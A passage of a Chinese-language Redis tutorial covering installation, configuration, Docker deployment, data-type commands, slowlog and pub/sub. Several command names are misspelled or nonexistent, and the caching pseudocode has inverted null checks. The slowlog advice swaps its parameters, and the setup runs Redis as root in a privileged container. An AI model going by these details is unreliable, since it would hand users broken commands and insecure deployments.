+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>设置密码</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code># requirepass foobared
+修改为
+requirepass password(需要设置的密码)
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>进程在后台运行</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>daemonize no
+修改为
+daemonize yes
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>日志输出文件等信息</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>logfile &quot;&quot;
+修改为指定的日志文件
+logfile &quot;/var/log/redis/6379.log&quot;
+
+#创建目录
+mkdir /var/log/redis
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>开放端口</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>firewall-cmd --add-port=6379/tcp --permanent
+#重新加载防火墙设置
+firewall-cmd --reload
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="redis-开机启动"><a href="#redis-开机启动" class="header-anchor">#</a> Redis 开机启动</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>cat &gt; /usr/lib/systemd/system/redis.service &lt;&lt;-EOF
+[Unit]
+Description=Redis persistent key-value database
+After=network.target
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf --supervised systemd
+ExecStop=/usr/local/bin/redis-cli shutdown
+Type=notify
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+# 使服务自动运行
+systemctl daemon-reload
+systemctl enable redis
+# 启动服务
+systemctl restart redis
+systemctl status redis
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h3 id="docker-安装-redis"><a href="#docker-安装-redis" class="header-anchor">#</a> Docker 安装 Redis</h3> <h4 id="拉取镜像"><a href="#拉取镜像" class="header-anchor">#</a> 拉取镜像</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#docker pull redis:latest</span>
+<span class="token comment">#docker pull redis:alpine</span>
+docker pull redis:3.2
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="运行-redis"><a href="#运行-redis" class="header-anchor">#</a> 运行 Redis</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#mkdir -p /home/data/redis</span>
+<span class="token function">mkdir</span> -p /home/docker/redis/<span class="token punctuation">{</span>conf,data<span class="token punctuation">}</span>
+<span class="token builtin class-name">cd</span> /home/docker/redis
+<span class="token comment">#https://redis.io/topics/config</span>
+<span class="token function">wget</span> https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf -O conf/redis.conf
+
+docker run -d --privileged<span class="token operator">=</span>true --restart<span class="token operator">=</span>always -p <span class="token number">6379</span>:6379 -v <span class="token environment constant">$PWD</span>/conf/redis.conf:/etc/redis/redis.conf -v <span class="token environment constant">$PWD</span>/data:/data --name redis redis:3.2 redis-server /etc/redis/redis.conf --appendonly <span class="token function">yes</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="可视化工具"><a href="#可视化工具" class="header-anchor">#</a> 可视化工具</h3> <ul><li><a href="https://github.com/qishibo/AnotherRedisDesktopManager" target="_blank" rel="noopener noreferrer">Another Redis DeskTop Manager<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 免费</li> <li><a href="https://github.com/luin/medis" target="_blank" rel="noopener noreferrer">Medis<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 收费，开源可以自行编译</li> <li><a href="https://github.com/uglide/RedisDesktopManager" target="_blank" rel="noopener noreferrer">Redis Desktop Manager<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 收费，开源可以自行编译</li></ul> <h2 id="使用"><a href="#使用" class="header-anchor">#</a> 使用</h2> <h3 id="通用命令"><a href="#通用命令" class="header-anchor">#</a> 通用命令</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#遍历所有key</span>
+keys *
+<span class="token comment">#计算key的总数</span>
+dbsize
+<span class="token comment">#检查key是否存在</span>
+exists key
+<span class="token comment">#删除指定key-value</span>
+del key <span class="token punctuation">[</span>key <span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#设置key在seconds秒后过期</span>
+expire key seconds
+<span class="token comment">#查看key剩余的过期时间</span>
+ttl key
+<span class="token comment">#去掉key的过期时间</span>
+persist key
+<span class="token comment">#返回key的类型</span>
+<span class="token builtin class-name">type</span> key
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h3 id="字符串"><a href="#字符串" class="header-anchor">#</a> 字符串</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#获取key对应的value</span>
+get key
+<span class="token comment">#设置key-value</span>
+<span class="token builtin class-name">set</span> key value
+<span class="token comment">#删除key-value</span>
+del key
+
+<span class="token comment">#key自增1，如果key不存在，自增后get(key)=1</span>
+incr key
+<span class="token comment">#key自减1，如果key不存在，自减后get(key)=-1</span>
+decr key
+<span class="token comment">#key自增k，如果key不存在，自增后get(key)=k</span>
+incrby key k
+<span class="token comment">#key自减k，如果key不存在，自减后get(key)=-k</span>
+decrby key k
+
+<span class="token comment">#不管key是否存在，都设置</span>
+<span class="token builtin class-name">set</span> key value
+<span class="token comment">#key不存在，才设置</span>
+setnx key value
+<span class="token comment">#key存在，才设置</span>
+<span class="token builtin class-name">set</span> key value xx
+
+<span class="token comment">##批量获取key</span>
+megt key1 key2 key3
+<span class="token comment">#批量设置key-value</span>
+mset key1 value1 key2 value2 key3 value3
+
+<span class="token comment">#set key newvalue并返回旧的value</span>
+<span class="token builtin class-name">set</span> key newvalue
+<span class="token comment">#将value追加到旧的value</span>
+append key value
+<span class="token comment">#返回字符串的长度（注意中文）</span>
+strlen key
+
+<span class="token comment">#增加key对应的值</span>
+incrbyfloat key value
+<span class="token comment">#获取字符串指定下标所有的值</span>
+getrange key start end
+<span class="token comment">#设置指定下标所有对应的值</span>
+setrange key index value
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><h4 id="实战"><a href="#实战" class="header-anchor">#</a> 实战</h4> <ul><li>记录网站每个用户个人主页的访问量</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>incr userid:pageview
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>缓存视频的基本信息（数据源在 MySQL 中）伪代码</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>public VideoInfo get(long id) {
+    String redisKey = redisPrefix + id;
+    VideoInfo videoInfo = redis.get(redisKey);
+    if (videoInfo != null) {
+        redis.set(redisKey, serialize(videoInfo));
+    }
+    return videoInfo;
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>分布式 id 生成器</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>incr <span class="token function">id</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="哈希"><a href="#哈希" class="header-anchor">#</a> 哈希</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#获取hash key对应field的value</span>
+hget key field
+<span class="token comment">#设置hash key对应field的value</span>
+hset key field value
+<span class="token comment">#删除hash key对应field的value</span>
+hdel key field
+<span class="token comment">#判断hash key是否有field</span>
+hexists key field
+<span class="token comment">#获取hash key field的数量</span>
+hlen key
+<span class="token comment">#批量获取hash key的一批field对应的值</span>
+hmget key field1 field2 <span class="token punctuation">..</span>. fieldN
+<span class="token comment">#批量设置hash key的一批field value</span>
+hmset key field1 value1 field2 value2<span class="token punctuation">..</span>.fieldN valueN
+
+<span class="token comment">#返回hash key对应所有的field和value</span>
+hgetall key
+<span class="token comment">#返回hash key对应所有field的value</span>
+hvals key
+<span class="token comment">#返回hash key对应所有field</span>
+hkeys key
+
+<span class="token comment">#设置hash key对应field的value(如field已经存在，则失败)</span>
+hsetnx key field value
+<span class="token comment">#hash key对应的field的value自增intCount</span>
+hincrby key field intCount
+<span class="token comment">#hincrby浮点数版</span>
+hincrbyfloat key field floatCount
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h4 id="实战-2"><a href="#实战-2" class="header-anchor">#</a> 实战</h4> <ul><li>记录网站每个用户个人主页的访问量</li></ul> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>hincrby user:1:info pageview count
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>缓存视频的基本信息（数据源在 MySQL 中）伪代码</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>public VideoInfo get(long id) {
+    String redisKey = redisPrefix + id;
+    Map&lt;String, String&gt; hashMap = redis.hgetAll(redisKey);
+    VideoInfo videoInfo = transferMapToVideo(hashMap);
+    if (videoInfo == null) {
+        videoInfo = mysql.get(id);
+        if (videoInfo == null) {
+            redis.hmset(redisKey, transferVideoToMap(videoInfo));
+        }
+    }
+    return videoInfo;
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="列表"><a href="#列表" class="header-anchor">#</a> 列表</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#从列表右端插入值（1-N个）</span>
+rpush key value1 value2 <span class="token punctuation">..</span>.valueN
+<span class="token comment">#从列表左端插入值（1-N个）</span>
+lpush key value1 value2 <span class="token punctuation">..</span>.valueN
+<span class="token comment">#在list指定的值前|后插入newValue</span>
+linsert key before<span class="token operator">|</span>after value newValue
+<span class="token comment">#从列表左侧弹出一个item</span>
+lpop key
+<span class="token comment">#从列表右侧弹出一个item</span>
+rpop key
+<span class="token comment">#根据count值，从列表中删除所有value相等的项</span>
+<span class="token comment">#(1)count&gt;0，从左到右，删除最多count个value相等的项</span>
+<span class="token comment">#(2)count&lt;0，从右到左，删除最多Math.abs(count)个value相等的项</span>
+<span class="token comment">#(3)count=0，删除所有value相等的项</span>
+lrem key count value
+<span class="token comment">#按照索引范围修剪列表</span>
+ltrim key start end
+<span class="token comment">#获取列表指定索引范围所有item</span>
+lrange key start end
+<span class="token comment">#获取列表指定索引的item</span>
+lindex key index
+<span class="token comment">#获取列表长度</span>
+llen key
+<span class="token comment">#设置列表指定索引值为newValue</span>
+lset key index newValue
+
+<span class="token comment">#lpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞</span>
+blpop key <span class="token function">timeout</span>
+<span class="token comment">#rpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞</span>
+rlpop key <span class="token function">timeout</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><h4 id="实战-3"><a href="#实战-3" class="header-anchor">#</a> 实战</h4> <ul><li>TimeLine</li></ul> <p>你关注的人更新微博，LPUSH</p> <h4 id="tips"><a href="#tips" class="header-anchor">#</a> Tips</h4> <ul><li>LPUSH + LPOP = Stack</li> <li>LPUSH + RPOP = Queue</li> <li>LPUSH + LTRIM = Capped Collection</li> <li>LPUSH + BRPOP = Message Queue</li></ul> <h3 id="集合"><a href="#集合" class="header-anchor">#</a> 集合</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#向集合key添加element（如果element已经存在，添加失败）</span>
+sadd key element
+<span class="token comment">#将集合key中的element移除掉</span>
+srem key element
+<span class="token comment">#计算集合大小</span>
+scard key
+<span class="token comment">#判断element是否在集合中</span>
+sismember key element
+<span class="token comment">#从集合中随机挑count个元素</span>
+srandmember key count
+<span class="token comment">#从集合中随机弹出一个元素</span>
+spop key
+<span class="token comment">#获取集合所有元素</span>
+smembers key
+<span class="token comment">#差集</span>
+<span class="token function">sdiff</span> key1 key2
+<span class="token comment">#交集</span>
+sinter key1 key2
+<span class="token comment">#并集</span>
+sunion key1 key2
+<span class="token comment">#将差集、交集、并集结果保存到destkey</span>
+<span class="token function">sdiff</span><span class="token operator">|</span>sinter<span class="token operator">|</span>sunion + store destkey
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h4 id="tips-2"><a href="#tips-2" class="header-anchor">#</a> TIPS</h4> <ul><li>SADD = Tagging</li> <li>SPOP/SRANDMEMBER = Random item</li> <li>SADD + SINTER = Social Graph</li></ul> <h3 id="有序集合"><a href="#有序集合" class="header-anchor">#</a> 有序集合</h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#添加score和element</span>
+zadd key score element
+<span class="token comment">#删除元素</span>
+zrem key element
+<span class="token comment">#返回元素的分数</span>
+zscore key element
+<span class="token comment">#增加或减少元素的分数</span>
+zincrby key increScore element
+<span class="token comment">#返回元素的总个数</span>
+zcard key
+<span class="token comment">#返回元素的排名</span>
+zrank key element
+<span class="token comment">#返回指定索引范围内的升序元素[分值]</span>
+zrange key start end <span class="token punctuation">[</span>WITHSCORES<span class="token punctuation">]</span>
+<span class="token comment">#返回指定分数范围内的升序元素[分值]</span>
+zrangebyscore key minScore maxScore <span class="token punctuation">[</span>WITHSCORES<span class="token punctuation">]</span>
+<span class="token comment">#返回有序集合内在指定分数范围内的个数</span>
+zcount key minScore maxScore
+<span class="token comment">#删除指定排名内的升序元素</span>
+zremrangebyrank key start end
+<span class="token comment">#删除指定分数内的升序元素</span>
+zremrangebyscore key minScore maxScore
+
+zrevrank
+zrevrange
+zrevrangebyscore
+zinterstore
+zunionstore
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h4 id="实战-4"><a href="#实战-4" class="header-anchor">#</a> 实战</h4> <ul><li>排名榜</li></ul> <h2 id="客户端"><a href="#客户端" class="header-anchor">#</a> 客户端</h2> <h4 id="参考-https-redis-io-clients"><a href="#参考-https-redis-io-clients" class="header-anchor">#</a> 参考：<a href="https://redis.io/clients" target="_blank" rel="noopener noreferrer">https://redis.io/clients<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></h4> <h3 id="jedis"><a href="#jedis" class="header-anchor">#</a> Jedis</h3> <h4 id="参考-https-github-com-xetorthio-jedis"><a href="#参考-https-github-com-xetorthio-jedis" class="header-anchor">#</a> 参考：<a href="https://github.com/xetorthio/jedis" target="_blank" rel="noopener noreferrer">https://github.com/xetorthio/jedis<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></h4> <h3 id="redis-py"><a href="#redis-py" class="header-anchor">#</a> redis-py</h3> <h4 id="参考-https-github-com-andymccurdy-redis-py"><a href="#参考-https-github-com-andymccurdy-redis-py" class="header-anchor">#</a> 参考：<a href="https://github.com/andymccurdy/redis-py" target="_blank" rel="noopener noreferrer">https://github.com/andymccurdy/redis-py<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></h4> <h3 id="redigo"><a href="#redigo" class="header-anchor">#</a> redigo</h3> <h4 id="参考"><a href="#参考" class="header-anchor">#</a> 参考：</h4> <ul><li><p><a href="https://github.com/gomodule/redigo" target="_blank" rel="noopener noreferrer">https://github.com/gomodule/redigo<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p><a href="https://godoc.org/github.com/gomodule/redigo/redis" target="_blank" rel="noopener noreferrer">https://godoc.org/github.com/gomodule/redigo/redis<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li></ul> <h2 id="应用"><a href="#应用" class="header-anchor">#</a> 应用</h2> <h3 id="慢查询"><a href="#慢查询" class="header-anchor">#</a> 慢查询</h3> <h4 id="生命周期"><a href="#生命周期" class="header-anchor">#</a> 生命周期</h4> <ol><li>发送命令</li> <li>排队</li> <li>执行命令</li> <li>返回结果</li></ol> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>慢查询发送在第 3 阶段</p> <p>客户端超时不一定慢查询，但慢查询是客户端超时的一个可能因素</p></div> <h4 id="配置"><a href="#配置" class="header-anchor">#</a> 配置</h4> <ul><li>slowlog-max-len</li></ul> <ol><li>先进先出队列</li> <li>固定长度</li> <li>保存在内存内</li></ol> <ul><li>slowlog-log-slower-than</li></ul> <ol><li>慢查询阈值（单位：微秒）</li> <li>slowlog-log-slower-than=0, 记录所有命令</li> <li>slowlog-log-slower-than&lt;0, 不记录任何命令</li></ol> <h4 id="配置方法"><a href="#配置方法" class="header-anchor">#</a> 配置方法</h4> <ol><li>默认值</li></ol> <ul><li>config get slowlog-max-len = 128</li> <li>config get slowlog-log-slower-than = 10000</li></ul> <ol start="2"><li>修改配置文件重启</li> <li>动态配置</li></ol> <ul><li>config set slowlog-max-len 1000</li> <li>config set slowlog-log-slower-than 1000</li></ul> <h4 id="命令"><a href="#命令" class="header-anchor">#</a> 命令</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#获取慢查询队列</span>
+slowlog get <span class="token punctuation">[</span>n<span class="token punctuation">]</span>
+<span class="token comment">#获取慢查询队列长度</span>
+slowlog len
+<span class="token comment">#清空慢查询队列</span>
+slowlog reset
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="运维经验"><a href="#运维经验" class="header-anchor">#</a> 运维经验</h4> <ol><li>slowlog-max-len 不要设置过大，默认 10ms，通常设置 1ms</li> <li>slowlog-log-slower-than 不要设置过小，通常设置 1000 左右</li> <li>理解命令生命周期</li> <li>定期持久化慢查询</li></ol> <h3 id="pipeline"><a href="#pipeline" class="header-anchor">#</a> pipeline</h3> <p>流水线</p> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>注意每次 pipeline 携带数据量</p> <p>pipeline 每次只能作用在一个 Redis 节点上</p> <p>M 操作与 pipeline 区别</p></div> <h3 id="发布订阅"><a href="#发布订阅" class="header-anchor">#</a> 发布订阅</h3> <h4 id="角色"><a href="#角色" class="header-anchor">#</a> 角色</h4> <ul><li><p>发布者(publisher)</p></li> <li><p>订阅者(subscriber)</p></li> <li><p>频道(channel)</p></li></ul> <h4 id="模型"><a href="#模型" class="header-anchor">#</a> 模型</h4> <h4 id="命令-2"><a href="#命令-2" class="header-anchor">#</a> 命令</h4> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token comment">#publisher</span>
+publish channel message
+<span class="token comment">#subscriber 一个或多个</span>
+subscriber <span class="token punctuation">[</span>channel<span class="token punctuation">]</span>
+<span class="token comment">#unsubscriber 一个或多个</span>
+unsubscriber <span class="token punctuation">[</span>channel<span class="token punctuation">]</span>
+
+<span class="token comment">#订阅模式</span>
+psubscriber <span class="token punctuation">[</span>pattern<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#退订指定的模式</span>
+punsubscriber <span class="token punctuation">[</span>pattern<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+<span class="token comment">#列出至少有一个订阅者的频道</span>
+pubsub channels
+<span class="token comment">#列出给定频道的订阅者数量</span>
+pubsub numsub <span class="token punctuation">[</span>channel<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
